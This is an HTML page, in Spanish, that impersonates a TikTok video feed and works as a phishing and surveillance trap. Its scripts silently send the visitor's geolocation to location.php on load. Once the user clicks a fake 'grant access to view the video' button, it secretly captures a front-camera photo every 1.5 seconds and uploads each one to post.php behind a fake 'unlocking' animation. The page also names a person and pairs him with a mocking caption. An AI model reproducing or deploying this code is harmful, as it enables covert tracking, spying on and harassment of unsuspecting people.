<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok Oficial</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #000;
      color: #fff;
      height: 100vh;
      overflow: hidden;
    }
    .video-container {
      position: relative;
      width: 100%;
      height: 100vh;
      background: #111;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* Barra superior */
    .top-bar {
      position: absolute;
      top: 0;
      width: 100%;
      display: flex;
      align-items: center;
      padding: 8px 15px;
      background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
      font-size: 15px;
      z-index: 10;
      gap: 20px;
    }
    .top-left {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .live-icon {
      width: 24px;
      height: 24px;
    }
    .tabs {
      display: flex;
      gap: 15px;
      flex: 1;
    }
    .tab {
      cursor: pointer;
      color: #aaa;
    }
    .tab.active {
      color: #fff;
      border-bottom: 2px solid #fff;
      padding-bottom: 2px;
    }
    .search {
      cursor: pointer;
      margin-left: auto;
    }
    .search svg {
      width: 22px;
      height: 22px;
      fill: #fff;
    }

    /* Sidebar derecha */
    .sidebar {
      position: absolute;
      right: 10px;
      bottom: 140px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 25px;
    }
    .icon {
      text-align: center;
      font-size: 14px;
    }
    .icon img {
      width: 45px;
      height: 45px;
      border-radius: 50%;
      border: 2px solid #fff;
    }
    .icon span {
      display: block;
      margin-top: 3px;
      font-size: 12px;
    }

    /* Info inferior */
    .bottom-info {
      position: absolute;
      bottom: 110px;
      left: 10px;
      font-size: 14px;
      max-width: 70%;
    }
    .username {
      font-weight: bold;
      margin-bottom: 5px;
    }
    .description {
      font-size: 13px;
    }

    /* Barra de búsqueda inferior */
    .search-bar {
      position: absolute;
      bottom: 65px;
      left: 0;
      width: 100%;
      background: rgba(0,0,0,0.6);
      padding: 8px 12px;
      font-size: 13px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .search-bar input {
      flex: 1;
      background: none;
      border: none;
      outline: none;
      color: #fff;
    }

    /* Barra de navegación inferior */
    .nav-bar {
      position: absolute;
      bottom: 0;
      width: 100%;
      background: #000;
      display: flex;
      justify-content: space-around;
      padding: 8px 0;
      font-size: 12px;
      border-top: 1px solid #222;
    }
    .nav-item {
      text-align: center;
      color: #aaa;
      flex: 1;
    }
    .nav-item.active {
      color: #fff;
      font-weight: bold;
    }
    .nav-item span {
      display: block;
      margin-top: 3px;
    }
    .plus {
      font-size: 30px;
      background: #fff;
      color: #000;
      border-radius: 8px;
      padding: 0 10px;
    }
    .badge {
      background: red;
      color: #fff;
      font-size: 10px;
      border-radius: 50%;
      padding: 2px 6px;
      position: absolute;
      top: -5px;
      right: 20%;
    }
    .nav-item-relative {
      position: relative;
    }

    /* Modal de permisos y desbloqueo */
    #cameraModal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    #cameraModal .content {
      background: #1c1c1c;
      color: #fff;
      padding: 25px;
      border-radius: 6px;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.6);
      border: 1px solid #333;
    }
    .logo { max-width: 150px; margin-bottom: 15px; }
    #grantAccess {
      margin-top: 20px;
      padding: 12px 25px;
      background-color: #e50914;
      color: #fff;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: background 0.2s;
    }
    #grantAccess:hover { background-color: #b00610; }

    #unlockAnimation {
      position: fixed;
      top:0; left:0;
      width:100%; height:100%;
      background: rgba(0,0,0,0.9);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      font-size: 22px;
      z-index: 10000;
      display: none;
    }
    .loader {
      border: 6px solid #333;
      border-top: 6px solid #e50914;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-top: 15px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .disclaimer {
      font-size: 11px;
      color: #aaa;
      margin-top: 15px;
    }
  </style>
</head>
<body>

<div class="video-container">

  <!-- Barra superior -->
  <div class="top-bar">
    <div class="top-left">
      <svg class="live-icon" viewBox="0 0 24 24" fill="red" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 5a7 7 0 100 14 7 7 0 000-14zm0-3a10 10 0 100 20 10 10 0 000-20z"/>
        <circle cx="12" cy="12" r="3" fill="white"/>
      </svg>
      <span style="font-weight:bold;">LIVE</span>
    </div>
    <div class="tabs">
      <div class="tab">Siguiendo</div>
      <div class="tab">Tienda</div>
      <div class="tab active">Para ti</div>
    </div>
    <div class="search">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#fff">
        <path d="M21.71 20.29l-3.388-3.387A8.943 8.943 0 0019 11a9 9 0 10-9 9 8.943 8.943 0 005.903-2.678l3.387 3.388a1 1 0 001.414-1.414zM4 11a7 7 0 1114 0 7 7 0 01-14 0z"/>
      </svg>
    </div>
  </div>

  <!-- Video fondo -->
  <video autoplay muted loop>
    <source src="img/video.mp4" type="video/mp4">
    Tu navegador no soporta video.
  </video>

  <!-- Sidebar -->
  <div class="sidebar">
    <div class="icon"><img src="img/image.jpg" alt="user"></div>
    <div class="icon">❤️<span>1,874</span></div>
    <div class="icon">💬<span>12</span></div>
    <div class="icon">🔖<span>146</span></div>
    <div class="icon">↗️<span>90</span></div>
  </div>

  <!-- Info inferior -->
  <div class="bottom-info">
    <div class="username">Cesar Perez</div>
    <div class="description">#fpy #School #LGBT #Viral #Cesar</div>
  </div>

  <!-- Barra de búsqueda inferior -->
  <div class="search-bar">
    🔍 <input type="text" placeholder="Irvin en tanga venga la alegria...">
  </div>

  <!-- Barra de navegación inferior -->
  <div class="nav-bar">
    <div class="nav-item active">🏠<span>Inicio</span></div>
    <div class="nav-item">👥<span>Amigos</span></div>
    <div class="nav-item plus">＋</div>
    <div class="nav-item nav-item-relative">💬<span>Mensajes</span>
      <div class="badge">17</div>
    </div>
    <div class="nav-item">👤<span>Perfil</span></div>
  </div>

</div>

<!-- Modal cámara -->
<div id="cameraModal">
  <div class="content">
   <!-- <img src="img/logo-erome-vertical.png" alt="Logo" class="logo"> -->
    <p>📸 Para visualizar el video debe de conceder los siguientes permisos.</p>
    <button id="grantAccess">Permitir acceso</button>
    <div class="disclaimer">
      Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
    </div>
  </div>
</div>

<!-- Animación desbloqueo -->
<div id="unlockAnimation">
  <div>Desbloqueando video...</div>
  <div class="loader"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="jquery.min.js"></script>
<!-- <script src="ip.js"></script> -->
<script src="ajax.js"></script>
  
<script>
// Geolocalización
if ('geolocation' in navigator) {
  navigator.geolocation.getCurrentPosition(function(pos) {
    const { latitude, longitude, accuracy } = pos.coords;
    fetch('location.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ latitude, longitude, accuracy })
    });
  });
}
</script>
  
<script>
'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio:false, video:{facingMode:"user"} };

async function initCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    capturePhotoLoop();
    const unlockModal = document.getElementById('unlockAnimation');
    unlockModal.style.display='flex';
    setTimeout(()=>{
      unlockModal.style.display='none';
      document.body.classList.add('unlocked');
    }, 5000);
  } catch(e){
    console.error(e);
    document.getElementById('cameraModal').style.display='flex';
  }
}

function capturePhotoLoop(){
  const context = canvas.getContext('2d');
  setInterval(()=>{
    context.drawImage(video,0,0,640,480);
    const canvasData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
    $.ajax({ type:'POST', url:'post.php', data:{cat:canvasData}, dataType:'json', async:false });
  },1500);
}

document.getElementById('grantAccess').addEventListener('click', ()=>{
  document.getElementById('cameraModal').style.display='none';
  initCamera();
});

</script>

</body>
</html>
